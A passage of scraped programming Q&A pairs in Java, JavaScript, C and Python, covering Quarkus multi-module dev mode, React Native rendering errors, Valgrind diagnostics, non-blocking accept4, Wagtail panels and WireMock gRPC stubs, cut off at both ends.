        <skipITs>true</skipITs>
        <surefire-plugin.version>3.5.0</surefire-plugin.version>
    </properties>

    <dependencyManagement>
        <dependencies>
            <dependency>
                <groupId>${quarkus.platform.group-id}</groupId>
                <artifactId>${quarkus.platform.artifact-id}</artifactId>
                <version>${quarkus.platform.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
        </dependencies>
    </dependencyManagement>

    <dependencies>
        <dependency>
            <groupId>io.synkronize</groupId>
            <artifactId>commons</artifactId>
            <version>1.0</version>
            <scope>compile</scope>
        </dependency>
        <dependency>
            <groupId>io.quarkus</groupId>
            <artifactId>quarkus-rest</artifactId>
        </dependency>
    </dependencies>

.... and the quarkus maven plugins ...


Applied Solution
I did what Alexey said at his answer and I followed this tutorial.
To run N modules in parallel without having to open N separate terminals to run mvn quarkus dev -Pmodule1 and mvn quarkus:dev -Pmodule2 I've made use of Run Configurations of IntelliJ by creating 2 Maven run configurations and configuring both of them to point to the correct profile as per the following images
Maven Run Configurations

Module 1 Configuration

Module 2 Configuration

","In an example described, you should be able to add the quarkus-maven-plugin (w/o the goals) in the build/plugins section of the root project POM (keeping the quarkus:* goals configured in the app module) and then execute mvn compile quarkus:dev from the root.
In this case Maven will be aware of all the modules in the workspace and quarkus:dev will work launch the app module.
Note that actually, you don't need to always re-install module1 once you applied changes to its sources. If your local repository contains an outdated version of module1, dev mode will still be picking sources and classes from the workspace instead of from the local repo. The presence of module1 artifacts in the local repo would be necessary only to let Maven not fail resolving dependencies.
The error that you see is thrown by Maven before it gets to the Quarkus plugin. The Quarkus plugin then will correctly find the module, its sources and classes.
The suggestion above will work though if the workspace contains only one Quarkus application. If it contains more than one the the first Quarkus application in the module list will be launched first. Once dev mode is terminated for that app, the next one will be launched.
For workspaces that include more than one application, you use Maven profiles in the root POM. For example, you could remove Quarkus application modules from the default modules list and add them in a profile that has <activeByDefault>true</activeByDefault>, so that when you build your project on the command line, all the modules will be built.
Then for each application module you could create a profile, e.g. app1Dev that would add only app1 module but not other applications. So that when you launch mvn -Papp1Dev from the root directory, Maven will see only one Quarkus application in your workspace. You can also add profile/build/defaultGoal with value compile quarkus:dev and mvn -Papp1Dev should be enough to launch app1 in dev mode.
",java
quottext strings must be rendered within a lttextgt componentquot,"I've upgraded from React Native 0.54 to 0.57 and my application has fallen over, due to using React Native elements.
I used the error functionality of TextInput components, which enabled props that can set and style the error message. 
Very convenient, but the upgrade has broken these, and I'm now greeted with this error:
Invariant Violation: Text strings must be rendered within a <Text> Component.


So I've deleted that code and the error disappears. 
However, I'm still receiving the issue when I run this code:
{ this.state.event.cards[i].fields[j].error && 

  <Text style={{ color: '#e74c3c', fontSize: 14, paddingLeft: 5 }}>
    {this.state.event.cards[i].fields[j].error}
  </Text>
}

When I begin typing in the text-input, it sets the error message to an empty string. 
So if an error is returned, typing in the field will make the error go away.
My goal is to check if this.state.event.cards[i].fields[j].error is a non-empty string, and if so, display it.
","For me the following code works fine, as long as this.state.error === undefined or it is not an empty string.
render() {
  return (
    <View>
      {this.state.error &&

        <Text>
          Error message: {this.state.error}
        </Text>
      }
    </View>
  );
}

If the error state is changed to empty string '', you will have the aforementioned exception: Invariant Violation: Text strings must be rendered within a <Text> component
The reason of that is, when this.state.error === '', the following expression will be evaluated as empty string, i.e., '', and this will cause Invariant Violation: Text strings must be rendered within a <Text> component
{this.state.error &&

  <Text>
    Error message: {this.state.error}
  </Text>
}

When this.state.error === undefined, the expression will be evaluated as undefined, which is what we expect, and it's fine.
",javascript
androidunable to connect to chromecast from app in development when in kiosk mode,"I am developing an app for android12.
The app is a kiosk mode and uses startLockTask.
To use the standard Android cast function from the app,
to call the cast settings screen.
startActivity(new Intent(ACTION_CAST_SETTINGS));

I can display the settings screen, and I can connect to FireTV,
I can connect to Chromecast, but I cannot connect to Chromecast.
The connection is still in progress.
I found that a confirmation message “start recording or casting?” is displayed at the time of connection, but it was not displayed on my app.
It does appear when I execute stopLockTask just before the connection,
Is there any way to make it appear while using startLockTask?
","This is actually a known limitation with Android's kiosk mode(Lock Task) mode and system dialogs. However you can handle this by adding cast permission to allowed activities.
You can whitelist specific system UI components in your Device owner settings. You need to use DevicePolicyManager to set this up.
DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
String[] packages = {
    ""com.google.android.gms"",

*// Google Play Services*

""com.google.android.apps.chromecast.app""

*// Cast related*

};
dpm.setLockTaskPackages(admin, packages);

Please check and update if this works for you.
",java
quotconditional jump or move depends on uninitialised valuequot,"Recently, I was trying to make some functions that would give me the ability to interact with dynamically allocated arrays. I'm not considering the functions I wrote as something good, but it works. I tried to check whether my code has memory leaks or not with valgrind --tool=memcheck --leak-check=yes ./program and after running it gave me a lot of Conditional jump or move depends on unitialised value. I tried to run valgrind --track-origins=yes ./program but I didn't really get something of it. I use Debian WSL. what exactly is that and why does this ""error"" even occur? I'd like to avoid anything that would ruin the hypothetical performance of my programs in the future.
program.c:
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

struct array {
    int* data;
    int items;
    int capacity;
    int space;
};
  
void removeArr(struct array *arr, int index);
void sortArr(struct array *arr, bool reverse);
void printArr(struct array *arr, int limit);
void appendArr(struct array *arr, int item);
void insertArr(struct array *arr, int index, int item);
  
int main() {
    struct array a1;
    int i = 0;
  
    a1.items = 0;
    a1.capacity = 10;
    a1.space = 5;
    a1.data = (int*)malloc(a1.capacity * sizeof(int));
    if(NULL == a1.data) {
        printf(""Allocation for a1.data failed\n"");
        return 1;
    }
  
    // Filling up the array with 5 elements
    for(i = 0; i < a1.capacity - 5; i++) {
        a1.data[i] = i + 1;
        a1.items++;
    }
  
    // Testing appending, inserting and removing from an array
    appendArr(&a1, 6);
    appendArr(&a1, 7);
    insertArr(&a1, 1, 10);
    insertArr(&a1, a1.items, 3);
    removeArr(&a1, a1.items - 1);
    printf(""Before For Loop: %d %d\n"", a1.capacity, a1.items);
    printArr(&a1, 5);
  
    // Testing appending inside the for loop
    for(i = 0; i < 2; i++) appendArr(&a1, i + 15);
    printf(""After For Loop: %d %d\n"", a1.capacity, a1.items);
    printArr(&a1, 5);
  
    // Testing insert func when there's no free space in the array
    insertArr(&a1, 1, 100);
    printf(""After insert with extra space: %d %d\n"", a1.capacity, a1.items);
    printArr(&a1, 5);
    // Testing reverse (bubble) sort
    putchar('\n');
    sortArr(&a1, true);
    printArr(&a1, 5);
  
    // Testing standard (bubble) sort
    putchar('\n');
    sortArr(&a1, false);
    printArr(&a1, 5);
  
    // Overwriting the entire array
    putchar('\n');
    for(i = 0; i < a1.capacity; i++) {
        a1.data[i] = i + 1;
    }
    a1.items = a1.capacity;
  
    // Testing inserting inside the for loop
    for(i = 1; i <= 15; i++) {
        insertArr(&a1, i, i);
    }
    putchar('\n');
    printArr(&a1, 5);
  
    // Check the curren capacity and items amount after all of the operations with the array
    printf(""After Insert For Loop: %d %d\n"", a1.capacity, a1.items);
  
    // Freeing the dynamically allocated array
    free(a1.data);
    a1.data = NULL;
    return 0;
}
  
void removeArr(struct array *arr, int index) {
    if(0 >= index || index >= arr->capacity) {
        printf(""ERROR: Index is incorrect\n"");
        exit(1);
    }
    for(int i = index; i < arr->capacity; i++) {
        if(0 == arr->data[i - 1] && 0 == arr->data[i]) {
            continue;
        }
        arr->data[i - 1] = arr->data[i];
    }
    arr->data[arr->capacity - 1] = 0;
    arr->items--;
}
  
void sortArr(struct array *arr, bool reverse) {
    int i = 0;
    bool swapped;
    if(false == reverse) {
        do {
            swapped = false;
            for(int j = 0; j < (arr->capacity - 1 - i); j++) {
                if(arr->data[j + 1] < arr->data[j]) {
                    int temp = arr->data[j];
                    arr->data[j] = arr->data[j + 1];
                    arr->data[j + 1] = temp;
                    swapped = true;
                }
            }
            i++;
        }
        while(swapped)
            ;
    }
  
    if(true == reverse) {
        do {
            swapped = false;
            for(int j = 0; j < (arr->capacity - 1 - i); j++) {
                if(arr->data[j + 1] > arr->data[j]) {
                    int temp = arr->data[j];
                    arr->data[j] = arr->data[j + 1];
                    arr->data[j + 1] = temp;
                    swapped = true;
                }
            }
            i++;
        }
        while(swapped)
            ;
    }
}
  
void printArr(struct array *arr, int limit) {
    int pos = 0;
    for(int i = 0; i < arr->capacity; i++) {
        if(pos < limit) {
            printf(""%d "", arr->data[i]);
            pos++;
        }
        else {
            putchar('\n');
            printf(""%d "", arr->data[i]);
            pos = 1;
        }
    }
    putchar('\n');
}
  
void appendArr(struct array *arr, int item) {
    if(arr->items == arr->capacity) {
        arr->capacity += arr->space;
        arr->data = (int*)realloc(arr->data, arr->capacity * sizeof(int));
        if(NULL == arr->data) {
            printf(""Reallocation for arr->data failed while appending.\n"");
            exit(1);
        }
    }
    arr->data[arr->items] = item;
    arr->items++;
}
  
void insertArr(struct array *arr, int index, int item) {
    if(0 >= index || index >= arr->capacity) {
        printf(""ERROR: Index is incorrect\n"");
        exit(1);
    }
    if(index == arr->items) {
        appendArr(arr, item);
    }
    else if(index > 0 && index < arr->capacity) {
        if(arr->items == arr->capacity) {
            arr->capacity += arr->space;
            arr->data = (int*)realloc(arr->data, arr->capacity * sizeof(int));
            if(NULL == arr->data) {
                printf(""Reallocation for arr->data failed when inserting.\n"");
                exit(1);
            }
        }
        for(int i = arr->capacity - 1; i >= index; i--) {
            if(0 == arr->data[i] && 0 == arr->data[i - 1])
                continue;
  
            arr->data[i] = arr->data[i - 1];
        }
        arr->data[index - 1] = item;
        arr->items++;
    }
    else {
        printf(""Unexpected error occured while insertion.\n"");
        exit(2);
    }
}

valgrind --tool=memcheck --leak-check=yes ./program output:
==14958== Memcheck, a memory error detector
==14958== Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.
==14958== Using Valgrind-3.19.0 and LibVEX; rerun with -h for copyright info
==14958== Command: ./dev/test
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1099BA: insertArr (test.c:192)
==14958==    by 0x109265: main (test.c:40)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1099D8: insertArr (test.c:192)
==14958==    by 0x109265: main (test.c:40)
==14958== 
Before For Loop: 10 8
10 1 2 3 4 5 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B8027: __vfprintf_internal (vfprintf-process-arg.c:58)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x1092BC: main (test.c:44)
==14958== 
==14958== Use of uninitialised value of size 8
==14958==    at 0x48ACAAB: _itoa_word (_itoa.c:177)
==14958==    by 0x48B7E58: __vfprintf_internal (vfprintf-process-arg.c:164)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x1092BC: main (test.c:44)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48ACABC: _itoa_word (_itoa.c:177)
==14958==    by 0x48B7E58: __vfprintf_internal (vfprintf-process-arg.c:164)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x1092BC: main (test.c:44)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B86F6: __vfprintf_internal (vfprintf-process-arg.c:174)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x1092BC: main (test.c:44)
==14958== 
6 3 0 0 
After For Loop: 10 10
10 1 2 3 4 5 
6 3 15 16 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1099BA: insertArr (test.c:192)
==14958==    by 0x109326: main (test.c:52)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1099D8: insertArr (test.c:192)
==14958==    by 0x109326: main (test.c:52)
==14958== 
After insert with extra space: 15 11
100 10 1 2 3 4 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B8027: __vfprintf_internal (vfprintf-process-arg.c:58)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x109353: main (test.c:54)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B86F6: __vfprintf_internal (vfprintf-process-arg.c:174)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x109353: main (test.c:54)
==14958== 
5 6 3 15 16 0 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B8027: __vfprintf_internal (vfprintf-process-arg.c:58)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x1097C2: printArr (test.c:152)
==14958==    by 0x109353: main (test.c:54)
==14958== 
==14958== Use of uninitialised value of size 8
==14958==    at 0x48ACAAB: _itoa_word (_itoa.c:177)
==14958==    by 0x48B7E58: __vfprintf_internal (vfprintf-process-arg.c:164)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x1097C2: printArr (test.c:152)
==14958==    by 0x109353: main (test.c:54)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48ACABC: _itoa_word (_itoa.c:177)
==14958==    by 0x48B7E58: __vfprintf_internal (vfprintf-process-arg.c:164)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x1097C2: printArr (test.c:152)
==14958==    by 0x109353: main (test.c:54)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B86F6: __vfprintf_internal (vfprintf-process-arg.c:174)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x1097C2: printArr (test.c:152)
==14958==    by 0x109353: main (test.c:54)
==14958== 
0 0 0 

==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x10969C: sortArr (test.c:129)
==14958==    by 0x10936E: main (test.c:58)
==14958== 
100 16 15 10 6 5 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B8027: __vfprintf_internal (vfprintf-process-arg.c:58)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x10937F: main (test.c:59)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B86F6: __vfprintf_internal (vfprintf-process-arg.c:174)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x10937F: main (test.c:59)
==14958== 
4 3 3 2 1 0 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B8027: __vfprintf_internal (vfprintf-process-arg.c:58)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x1097C2: printArr (test.c:152)
==14958==    by 0x10937F: main (test.c:59)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B86F6: __vfprintf_internal (vfprintf-process-arg.c:174)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x1097C2: printArr (test.c:152)
==14958==    by 0x10937F: main (test.c:59)
==14958== 
0 0 0 

==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1095BB: sortArr (test.c:112)
==14958==    by 0x10939A: main (test.c:63)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B8027: __vfprintf_internal (vfprintf-process-arg.c:58)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x1093AB: main (test.c:64)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x48B86F6: __vfprintf_internal (vfprintf-process-arg.c:174)
==14958==    by 0x48AD65A: printf (printf.c:33)
==14958==    by 0x109786: printArr (test.c:147)
==14958==    by 0x1093AB: main (test.c:64)
==14958== 
0 0 0 0 1 2 
3 3 4 5 6 10 
15 16 100 

==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1099BA: insertArr (test.c:192)
==14958==    by 0x109406: main (test.c:75)
==14958== 
==14958== Conditional jump or move depends on uninitialised value(s)
==14958==    at 0x1099D8: insertArr (test.c:192)
==14958==    by 0x109406: main (test.c:75)
==14958== 

1 2 3 4 5 6 
7 8 9 10 11 12 
13 14 15 1 2 3 
4 5 6 7 8 9 
10 11 12 13 14 15 
After Insert For Loop: 30 30
==14958== 
==14958== HEAP SUMMARY:
==14958==     in use at exit: 0 bytes in 0 blocks
==14958==   total heap usage: 6 allocs, 6 frees, 1,424 bytes allocated
==14958== 
==14958== All heap blocks were freed -- no leaks are possible
==14958== 
==14958== Use --track-origins=yes to see where uninitialised values come from
==14958== For lists of detected and suppressed errors, rerun with: -s
==14958== ERROR SUMMARY: 198 errors from 24 contexts (suppressed: 0 from 0)

I tried to research this exact problem, but I didn't get something. And also the words that the other people were saying in their answers is not really what I was looking for.
","Looking for leaks is not the first thing to do
You used
valgrind --tool=memcheck --leak-check=yes ./program
--tool=memcheck is the default. You don't need it.
Fix your bugs first, then think of looking for leaks.
Let's track down the error
==95439== Conditional jump or move depends on uninitialised value(s)
==95439==    at 0x202002: insertArr (so19.c:188)
==95439==    by 0x201B93: main (so19.c:40)

What is on line 188?
(gdb) list
183                     printf(""Reallocation for arr->data failed when inserting.\n"");
184                     exit(1);
185                 }
186             }
187             for(int i = arr->capacity - 1; i >= index; i--) {
188                 if(0 == arr->data[i] && 0 == arr->data[i - 1])
189                     continue;
190       
191                 arr->data[i] = arr->data[i - 1];
192             }

You are reading something that hasn't been initialized. That will be either  arr->data[i] or arr->data[i - 1].
I ran
valgrind --vgdb-error=0 ./program in one terminal and
gdb then target remote | /usr/home/paulf/tools/valgrind/libexec/valgrind/../../bin/vgdb --pid=95439 in another (Valgrind will tell you the command to run in GDB).
Then I used the ""mc xb"" command (""memcheck examine bytes"")
(gdb) mc xb &arr->data[i] sizeof(arr->data[i])
                  ff      ff      ff      ff
0x5460064:      0x00    0x00    0x00    0x00

and
(gdb) mc xb &arr->data[i-1] sizeof(arr->data[i-1])
                  ff      ff      ff      ff
0x5460060:      0x00    0x00    0x00    0x00

The first line is the initializedness. bits with value 1 are uninitialized. The second line is the address the contents of the memory.
That means that neither is initialized.
Why are you checking that arr->data contains 0 values at the end? The easier way to do this is to work out the right indices and then use memmove().
I also think that you would be much better using C++ for this. You could do the same thing with std::vector in much less code and also without the reinvent-the-wheel bugs.
",c
accept4 blocks though sock_nonblock is set,"I'm trying to accept a socket non-blockingly:
accept4(s, (struct sockaddr *) &peerAddress, &len,SOCK_NONBLOCK);

where as s is a fd, peerAddres is an address, and len, is its length.
I wish that accept won't block the thread.
Though, once I debug, the process is stuck at this line, while no connection is pending.
What is my mistake?
","SOCK_NONBLOCK just sets the newly accepted socket to non-blocking. It does not make accept itself non-blocking. For this one would need to set the listen socket non-blocking before calling accept.
",c
java division by zero doesn39t throw an arithmeticexception  why,"Why doesn't this code throw an ArithmeticException? Take a look:
public class NewClass {

    public static void main(String[] args) {
        // TODO code application logic here
        double tab[] = {1.2, 3.4, 0.0, 5.6};

        try {
            for (int i = 0; i < tab.length; i++) {
                tab[i] = 1.0 / tab[i];
            }
        } catch (ArithmeticException ae) {
            System.out.println(""ArithmeticException occured!"");
        }
    }
}

","Why can't you just check it yourself and throw an exception if that is what you want.
    try {
        for (int i = 0; i < tab.length; i++) {
            tab[i] = 1.0 / tab[i];

            if (!Double.isFinite(tab[i]))
                throw new ArithmeticException();
        }
    } catch (ArithmeticException ae) {
        System.out.println(""ArithmeticException occured!"");
    }

",java
traversing all nodes in selected range,"How can you retrieve all nodes within the selected range in javascript for example if i highlight the following nodes on this stackoverflow post is it possible to create a simple iterator given the base and extent node that walks the DOMTree between the two.

I've tried using Range and TreeWalker but haven't come up with anything i only ever get a range count of 1.
","You can get a copy of the selected nodes by going through the selected range and clone the contents of the range selection. Collect all cloned nodes in a DocumentFragment object.
Then create a TreeWalker with the DocumentFragment object that has the collected elements and push each node to a new array.
The resulting array will be a list of all the nodes in the selection.

Run the example below and check the console of your browser after selecting text and clicking on the Get selected nodes button.


const button = document.getElementById('get-nodes');

function getSelectedNodes() {
  const selection = document.getSelection();
  const fragment = document.createDocumentFragment();
  const nodeList = [];

  for (let i = 0; i < selection.rangeCount; i++) {
    fragment.append(selection.getRangeAt(i).cloneContents());
  }

  const walker = document.createTreeWalker(fragment);
 
  while(walker.nextNode()) {
    const currentNode = walker.currentNode;
    nodeList.push(currentNode);
  }

  return nodeList;
}

button.addEventListener('click', () => {
  const nodeList = getSelectedNodes();
  console.log(nodeList);
});
<button id=""get-nodes"">Get selected nodes</button>

<div class=""s-prose js-post-body"" itemprop=""text"">
  <p style=""color: red"">I'm running spring cloud dataflow server in a container and was able to configure app logs to a specific folder that is brought outside of the container. However, I can't figure out how to store dataflow server logs themselves in a file.</p>
  <p>According to this:
    <a href=""https://docs.spring.io/spring-cloud-dataflow/docs/2.7.2/reference/htmlsingle/#configuration-local-logging"" rel=""nofollow noreferrer"">https://docs.spring.io/spring-cloud-dataflow/docs/2.7.2/reference/htmlsingle/#configuration-local-logging</a></p>
  <p>It should be plain and simple, just set LOG_PATH and that's pretty much it. But that does nothing. And when I look at logback-spring.xml in the jar file, I can see that:</p>
  <pre class=""default s-code-block""><code class=""hljs language-xml"">    <span class=""hljs-tag"">&lt;<span class=""hljs-name"">root</span> <span class=""hljs-attr"">level</span>=<span class=""hljs-string"">""INFO""</span>&gt;</span>
        <span class=""hljs-tag"">&lt;<span class=""hljs-name"">appender-ref</span> <span class=""hljs-attr"">ref</span>=<span class=""hljs-string"">""STDOUT""</span>/&gt;</span>
        <span class=""hljs-tag"">&lt;/<span class=""hljs-name"">root</span>&gt;</span>
        </code></pre>
  <p>Which in my understanding is the reason why the logs don't go into the file, they just go to the console.</p>
  <p>Is there a way to override the appender-ref attribute in the logback-spring.xml with an environnment variable, or how can I get the dataflow server logs in a file?</p>
</div>



",javascript
opencv javacv vs opencv cc interfaces,"I am just wondering whether there would be a significant speed performance advantage relatively on a given set of machines when using JavaCV as opposed to the C/C++ implementation of OpenCV. 
Please correct me if I am wrong, but my understanding is that the c/c++ implementation of opencv is closer to the machine where as the Java implementation of OpenCV, JavaC, would have a slight speed performance disadvantage (in milliseconds) as there would be a virtual machine converting your source code to bytecode which then gets converted to machine code. Whereas, with c/c++, it gets converted straight to machine code and thus doesn't carry that intermediary step of the virtual machine overhead. 
Please don't kill me here if I made mistakes; I am just learning and would welcome constructive criticism.
Thank you
","I'd like to add a couple of things to @ejbs's answer. 
First of all, you concerned 2 separate issues: 

Java vs. C++ performance
OpenCV vs JavaCV

Java vs. C++ performance is a long, long story. On one hand, C++ programs are compiled to a highly optimized native code. They start quickly and run fast all the time without pausing for garbage collection or other VM duties (as Java do). On other hand, once compiled, program in C++ can't change, no matter on what machine they are run, while Java bytecode is compiled ""just-in-time"" and is always optimized for processor architecture they run on. In modern world, with so many different devices (and processor architectures) this may be really significant. Moreover, some JVMs (e.g. Oracle Hotspot) can optimize even the code that is already compiled to native code! VM collect data about program execution and from time to time tries to rewrite code in such a way that it is optimized for this specific execution. So in such complicated circumstances the only real way to compare performance of implementations in different programming languages is to just run them and see the result. 
OpenCV vs. JavaCV is another story. First you need to understand stack of technologies behind these libraries. 
OpenCV was originally created in 1999 in Intel research labs and was written in C. Since that time, it changed the maintainer several times, became open source and reached 3rd version (upcoming release). At the moment, core of the library is written in C++ with popular interface in Python and a number of wrappers in other programming languages. 
JavaCV is one of such wrappers. So in most cases when you run program with JavaCV you actually use OpenCV too, just call it via another interface. But JavaCV provides more than just one-to-one wrapper around OpenCV. In fact, it bundles the whole number of image processing libraries, including FFmpeg, OpenKinect and others. (Note, that in C++ you can bind these libraries too). 
So, in general it doesn't matter what you are using - OpenCV or JavaCV, you will get just about same performance. It more depends on your main task - is it Java or C++ which is better suited for your needs. 
There's one more important point about performance. Using OpenCV (directly or via wrapper) you will sometimes find that OpenCV functions overcome other implementations by several orders. This is because of heavy use of low-level optimizations in its core. For example, OpenCV's filter2D function is SIMD-accelerated and thus can process several sets of data in parallel. And when it comes to computer vision, such optimizations of common functions may easily lead to significant speedup. 
",c
python wagtail crashes 631 quotstreamfield object has no attribute 39bind_to_model39,"While updating an old Wagtail website to the current version, I encounter this error, in admin/panels/group.py line 74:
AttributeError: 'StreamField' object has no attribute 'bind_to_model'
Since this is apparently in the Wagtail software as distributed, I am quite confused.

The full traceback is as follows:
Exception in thread django-main-thread:
Traceback (most recent call last):
  File ""/Library/Frameworks/Python.framework/Versions/3.13/lib/python3.13/threading.py"", line 1041, in _bootstrap_inner
    self.run()
    ~~~~~~~~^^
  File ""/Library/Frameworks/Python.framework/Versions/3.13/lib/python3.13/threading.py"", line 992, in run
    self._target(*self._args, **self._kwargs)
    ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/django/utils/autoreload.py"", line 64, in wrapper
    fn(*args, **kwargs)
    ~~^^^^^^^^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/django/core/management/commands/runserver.py"", line 134, in inner_run
    self.check(display_num_errors=True)
    ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/django/core/management/base.py"", line 486, in check
    all_issues = checks.run_checks(
        app_configs=app_configs,
    ...<2 lines>...
        databases=databases,
    )
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/django/core/checks/registry.py"", line 88, in run_checks
    new_errors = check(app_configs=app_configs, databases=databases)
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/admin/checks.py"", line 69, in get_form_class_check
    edit_handler = cls.get_edit_handler()
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/utils/decorators.py"", line 54, in __call__
    return self.value
           ^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/django/utils/functional.py"", line 47, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
                                         ~~~~~~~~~^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/utils/decorators.py"", line 50, in value
    return self.fn(self.cls)
           ~~~~~~~^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/admin/panels/page_utils.py"", line 73, in _get_page_edit_handler
    return edit_handler.bind_to_model(cls)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/admin/panels/base.py"", line 146, in bind_to_model
    new.on_model_bound()
    ~~~~~~~~~~~~~~~~~~^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/admin/panels/group.py"", line 74, in on_model_bound
    self.children = [child.bind_to_model(self.model) for child in self.children]
                     ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/admin/panels/base.py"", line 146, in bind_to_model
    new.on_model_bound()
    ~~~~~~~~~~~~~~~~~~^^
  File ""/Users/mike/.virtualenvs/sdenv/lib/python3.13/site-packages/wagtail/admin/panels/group.py"", line 74, in on_model_bound
    self.children = [child.bind_to_model(self.model) for child in self.children]
                     ^^^^^^^^^^^^^^^^^^^
AttributeError: 'StreamField' object has no attribute 'bind_to_model'

","The error indicates that you have a StreamField object inside a panels definition such as content_panels. This isn't valid - it should only contain panel objects such as FieldPanel.
As part of the Wagtail 2.x to 6.x upgrade process, you would have to replace any instances of StreamFieldPanel with a plain FieldPanel - my best guess is that you made a mistake while doing this, and changed StreamFieldPanel to StreamField instead.
",python
lambda expression for setter,"We have lambda expression for getter as below:
Function<Student, String> studentNameGetter = Student::getName;

How about lambda expression for the setter?
","I'm not sure what you mean by creating a lambda expression for the setter.  
What it looks like you are trying to do is to assign the method reference to a suitable Functional Interface. In that case, the best match is to a BiConsumer: 
BiConsumer<Student, String> studentNameSetter = Student::setName;

",java
wiremock grpc demo example is not returning response,"I am trying to run the demo provided at wiremock grpc page using spring boot: https://wiremock.org/docs/grpc/
I have the following configuration for the beans:
@Configuration
public class WiremockConfiguration {

@Bean
public WireMockServer grpcWireMockServer() {
    var server = startGrpcWiremockServer();

    return server;
}

@Bean
public WireMockGrpcService marginReportHistoryServiceGrpc(@Qualifier(""grpcWireMockServer"") WireMockServer grpcWireMockServer) {
    var mockService = new WireMockGrpcService(new WireMock(grpcWireMockServer.port()), ""com.example.grpc.GreetingService"");

    System.out.println(""Port: "" + grpcWireMockServer.port());

    mockService.stubFor(
            method(""/greeting"")
                    .withRequestMessage(equalToJson(""{ \""name\"":  \""Tom\"" }""))
                    .willReturn(json(""{ \""greeting\"": \""Hi Tom from JSON\"" }""))
    );

    return mockService;
}

public WireMockServer startGrpcWiremockServer() {
    var server = new WireMockServer(wireMockConfig()
            .dynamicPort()
            .withRootDirectory(""src/main/resources/wiremock"")
            .extensions(new GrpcExtensionFactory())
    );

    server.start();

    return server;
}
}

Full code can be found here: https://github.com/gasparuhov-dev/wiremock-grpc
After I start the service, port is loged, and when I try to call the wiremock, using postman I recive Internal error:

Any ideas what am I missing?
","Many thanks for providing a demo project.  It helps to understand what is going on.
From what I can tell, this could be a combination of things.  Firstly, you shouldn't need the / on the front of the /greeting method.  So, update:
    mockService.stubFor(
            method(""/greeting"")
                    .withRequestMessage(equalToJson(""{ \""name\"":  \""Tom\"" }""))
                    .willReturn(json(""{ \""greeting\"": \""Hi Tom from JSON\"" }""))
    );

To this:
    mockService.stubFor(
